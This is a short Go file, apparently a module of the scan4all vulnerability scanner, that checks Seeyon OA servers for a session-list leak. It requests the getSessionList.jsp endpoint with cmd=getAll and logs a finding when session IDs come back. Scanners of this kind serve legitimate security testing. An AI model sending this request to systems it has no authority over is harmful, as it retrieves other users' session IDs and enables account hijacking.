package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

//getSessionList.jsp session 泄露

func GetSessionList(u string) bool {
	if req, err := util.HttpRequset(u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "sessionID") {
			util.GoPocLog(fmt.Sprintf("Found vuln seeyon GetSessionList|%s\n", u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll"))
			return true
		}
	}
	return false
}
